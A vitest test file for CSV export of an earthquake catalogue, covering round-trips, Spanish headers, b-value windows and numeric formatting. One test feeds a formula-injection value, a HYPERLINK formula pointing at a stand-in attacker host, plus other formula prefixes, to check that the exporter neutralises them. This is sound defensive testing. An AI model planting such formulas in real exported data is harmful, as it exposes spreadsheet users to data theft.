import { readFileSync } from "node:fs";
import { describe, expect, it } from "vitest";
import { fromCsv, toCsv, windowsToCsv } from "../core/csv.ts";
import { computeStats } from "../core/gr.ts";
import { parseCatalogHtml } from "../core/seiscomp.ts";

describe("csv", () => {
  it("round-trips the whole captured catalogue losslessly", () => {
    const html = readFileSync(new URL("./fixtures/seiscomp-2026-08-10_2026-09-18.html", import.meta.url), "utf8");
    const { events } = parseCatalogHtml(html);
    expect(fromCsv(toCsv(events))).toEqual(events);
  });

  it("quotes the comma in region names", () => {
    const html = readFileSync(new URL("./fixtures/seiscomp-2026-08-10_2026-09-18.html", import.meta.url), "utf8");
    const line = toCsv(parseCatalogHtml(html).events.slice(0, 1)).split("\n")[1]!;
    expect(line).toContain('"San Jose del Palmar - Choco, Colombia"');
  });

  it("writes b over time as one row per window, matching the statistics pipeline", () => {
    const html = readFileSync(new URL("./fixtures/seiscomp-2026-08-10_2026-09-18.html", import.meta.url), "utf8");
    const { windows } = computeStats(parseCatalogHtml(html).events);
    const lines = windowsToCsv(windows).trimEnd().split("\n");
    expect(lines[0]).toBe("from,to,n,mc,b,sigmaB,a,meanMag");
    expect(lines).toHaveLength(windows.length + 1);
    const last = lines.at(-1)!.split(",");
    expect(last[0]).toBe(windows.at(-1)!.from);
    expect(last.slice(2, 4)).toEqual(["150", "2.3"]);
    expect(Number(last[4])).toBeCloseTo(0.58, 2);
  });

  it("writes only the header when there are no windows", () => {
    expect(windowsToCsv([])).toBe("from,to,n,mc,b,sigmaB,a,meanMag\n");
  });

  it("translates only the header row, and reads a Spanish file back losslessly", () => {
    const html = readFileSync(new URL("./fixtures/seiscomp-2026-08-10_2026-09-18.html", import.meta.url), "utf8");
    const { events } = parseCatalogHtml(html);
    const [enHead, ...enRows] = toCsv(events).split("\n");
    const [esHead, ...esRows] = toCsv(events, "es").split("\n");
    expect(enHead).toBe("id,time,lat,lon,depthKm,mag,magType,phases,rmsS,gapDeg,errLatKm,errLonKm,errDepthKm,region,status,solutionStamp");
    expect(esHead).toBe("id,hora_utc,lat,lon,profundidad_km,magnitud,tipo_magnitud,fases,rms_s,gap_grados,err_lat_km,err_lon_km,err_prof_km,region,estado,sello_solucion");
    expect(esRows).toEqual(enRows);
    expect(fromCsv(toCsv(events, "es"))).toEqual(events);
  });

  // SGC is the sole author of region/magType/status and constrains none of them.
  // A leading =, +, -, @, tab or CR makes a spreadsheet treat the cell as a formula.
  it("neutralises a formula prefix in an upstream string field", () => {
    const e = {
      id: "SGC2026test01", time: "2026-09-01T00:00:00Z", lat: 5.1, lon: -76.5, depthKm: 40,
      mag: 3.2, magType: "MLr_1", phases: 12, rmsS: 0.4, gapDeg: 90,
      errLatKm: 1, errLonKm: 1, errDepthKm: 2,
      region: '=HYPERLINK("https://attacker.example/steal","click")',
      status: "manual", solutionStamp: null,
    };
    const row = toCsv([e]).split("\n")[1]!;
    expect(row).not.toMatch(/,=HYPERLINK/);
    expect(row).toContain("'=HYPERLINK");
  });

  it.each(["=cmd", "+1+1", "-1+1", "@SUM(A1)", "\tx", "\rx"])(
    "neutralises the formula prefix %j",
    (region) => {
      const row = toCsv([{ id: "x", time: "t", lat: 0, lon: 0, depthKm: 0, mag: 0, magType: "M", phases: null,
        rmsS: null, gapDeg: null, errLatKm: null, errLonKm: null, errDepthKm: null, region, status: "manual",
        solutionStamp: null } as never]).split("\n")[1]!;
      expect(row).toMatch(/,("?)'/);
    },
  );

  // The page uses a decimal point and a real minus sign everywhere; a negative number
  // must stay a number, or every depth error and b-value column becomes text.
  it("leaves negative and exponent numbers numeric", () => {
    const e = { id: "x", time: "t", lat: -76.5, lon: -1.5, depthKm: -2, mag: -1.2, magType: "M",
      phases: null, rmsS: null, gapDeg: null, errLatKm: -0.25, errLonKm: null, errDepthKm: null,
      region: "Istmina", status: "manual", solutionStamp: null };
    const row = toCsv([e] as never).split("\n")[1]!;
    expect(row).toContain("-76.5");
    expect(row).toContain("-1.2");
    expect(row).toContain("-0.25");
    expect(row).not.toContain("'-");
  });

  it("leaves a negative b-value numeric in the b-over-time export", () => {
    const csv = windowsToCsv([{ from: "2026-08-10T00:00:00Z", to: "2026-08-20T00:00:00Z", n: 150,
      mc: 2.3, b: 0.75, sigmaB: 0.031, a: -1.5, meanMag: 2.8 } as never]);
    expect(csv.split("\n")[1]).toContain("-1.5000");
    expect(csv).not.toContain("'-");
  });

  it("translates the b-over-time header", () => {
    expect(windowsToCsv([], "es")).toBe("desde,hasta,n,mc,b,sigma_b,a,magnitud_media\n");
  });
});
